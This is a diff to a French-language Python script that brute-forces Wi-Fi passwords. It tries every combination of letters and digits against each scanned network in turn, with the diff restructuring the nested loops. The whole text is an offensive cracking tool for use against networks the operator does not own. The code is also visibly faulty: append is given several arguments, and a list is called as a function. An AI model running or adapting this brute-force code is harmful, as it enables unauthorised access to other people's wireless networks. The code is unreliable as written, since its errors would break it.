@@ -55,100 +55,6 @@ ListReseauEtMDP = []
 def attaquePasswd(nombreReseau, tabCarac):
         passwd = ""
         for i in range(len(tabCarac)):
-            passwd = tabCarac[i]
-            if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
-                print("Mot de passe trouve : " + passwd)
-                ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])   
-                return True
-
-        for i in range(len(tabCarac)):
-            for j in range(len(tabCarac)):
-                passwd = tabCarac[i] + tabCarac[j]
-                if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
-                    print("Mot de passe trouve : " + passwd)
-                    ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau]) 
-                    return True
-
-        for i in range(len(tabCarac)):
-            for j in range(len(tabCarac)):
-                for k in range(len(tabCarac)):
-                    passwd = tabCarac[i] + tabCarac[j] + tabCarac[k]
-                    if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
-                        print("Mot de passe trouve : " + passwd)
-                        ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
-                        return True
-
-        for i in range(len(tabCarac)):
-            for j in range(len(tabCarac)):
-                for k in range(len(tabCarac)):
-                    for l in range(len(tabCarac)):
-                        passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l]
-                        if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
-                            print("Mot de passe trouve : " + passwd)
-                            ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])    
-                            return True
-
-        for i in range(len(tabCarac)):
-            for j in range(len(tabCarac)):
-                for k in range(len(tabCarac)):
-                    for l in range(len(tabCarac)):
-                        for m in range(len(tabCarac)):
-                            passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m]
-                            if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
-                                print("Mot de passe trouve : " + passwd)
-                                ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])    
-                                return True
-        for i in range(len(tabCarac)):
-            for j in range(len(tabCarac)):
-                for k in range(len(tabCarac)):
-                    for l in range(len(tabCarac)):
-                        for m in range(len(tabCarac)):
-                            for n in range(len(tabCarac)):
-                                passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n]
-                                if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
-                                    print("Mot de passe trouve : " + passwd)
-                                    ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau]) 
-                                    return True   
-        for i in range(len(tabCarac)):
-            for j in range(len(tabCarac)):
-                for k in range(len(tabCarac)):
-                    for l in range(len(tabCarac)):
-                        for m in range(len(tabCarac)):
-                            for n in range(len(tabCarac)):
-                                for o in range(len(tabCarac)):
-                                    passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n] + tabCarac[o]
-                                    if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
-                                        print("Mot de passe trouve : " + passwd)
-                                        ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau]) 
-                                        return True   
-        for i in range(len(tabCarac)):
-            for j in range(len(tabCarac)):
-                for k in range(len(tabCarac)):
-                    for l in range(len(tabCarac)):
-                        for m in range(len(tabCarac)):
-                            for n in range(len(tabCarac)):
-                                for o in range(len(tabCarac)):
-                                    for p in range(len(tabCarac)):
-                                        passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n] + tabCarac[o] + tabCarac[p]
-                                        if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
-                                            print("Mot de passe trouve : " + passwd)
-                                            ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
-                                            return True  
-        for i in range(len(tabCarac)):
-            for j in range(len(tabCarac)):
-                for k in range(len(tabCarac)):
-                    for l in range(len(tabCarac)):
-                        for m in range(len(tabCarac)):
-                            for n in range(len(tabCarac)):
-                                for o in range(len(tabCarac)):
-                                    for p in range(len(tabCarac)):
-                                        for q in range(len(tabCarac)):
-                                            passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n] + tabCarac[o] + tabCarac[p] + tabCarac[q]
-                                            if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
-                                                print("Mot de passe trouve : " + passwd)
-                                                ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])    
-                                                return True
-        for i in range(len(tabCarac)):
             for j in range(len(tabCarac)):
                 for k in range(len(tabCarac)):
                     for l in range(len(tabCarac)):
@@ -163,13 +69,58 @@ def attaquePasswd(nombreReseau, tabCarac):
                                                     print("Mot de passe trouve : " + passwd)
                                                     ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
                                                     return True  
-
+                                            passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n] + tabCarac[o] + tabCarac[p] + tabCarac[q]
+                                            if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
+                                                print("Mot de passe trouve : " + passwd)
+                                                ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
+                                                return True  
+                                        passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n] + tabCarac[o] + tabCarac[p]
+                                        if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
+                                            print("Mot de passe trouve : " + passwd)
+                                            ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
+                                            return True  
+                                    passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n] + tabCarac[o]
+                                    if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
+                                        print("Mot de passe trouve : " + passwd)
+                                        ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
+                                        return True  
+                                passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] + tabCarac[n]
+                                if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
+                                    print("Mot de passe trouve : " + passwd)
+                                    ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
+                                    return True  
+                            passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l] + tabCarac[m] 
+                            if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
+                                print("Mot de passe trouve : " + passwd)
+                                ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
+                                return True  
+                        passwd = tabCarac[i] + tabCarac[j] + tabCarac[k] + tabCarac[l]
+                        if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
+                            print("Mot de passe trouve : " + passwd)
+                            ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
+                            return True  
+                    passwd = tabCarac[i] + tabCarac[j] + tabCarac[k]
+                    if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
+                        print("Mot de passe trouve : " + passwd)
+                        ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
+                        return True 
+                passwd = tabCarac[i] + tabCarac[j] 
+                if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
+                    print("Mot de passe trouve : " + passwd)
+                    ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
+                    return True 
+            passwd = tabCarac[i]
+            if bruteforce(interface, reseaux[nombreReseau].ssid, passwd):
+                print("Mot de passe trouve : " + passwd)
+                ListReseauEtMDP.append("Le mot de passe est : ", passwd, "pour le réseau : ",reseaux[nombreReseau])  
+                return True 
 
 def iterationPasswd():
     tabCarac = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","0","1","2","3","4","5","6","7","8","9","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","W","X","Y","Z"]
-    passwd = ""
     for nombreReseau in range(len(reseaux)):
-        attaquePasswd(nombreReseau, tabCarac)
-        # print("Mot de passe non trouve pour le réseau :",reseaux(nombreReseau))
+        if(attaquePasswd(nombreReseau, tabCarac)):
+            print("Mot de passe trouve pour le réseau :",reseaux(nombreReseau))
+        else:
+            print("Mot de passe non trouve pour le réseau :",reseaux(nombreReseau))
     print(ListReseauEtMDP)
 iterationPasswd()
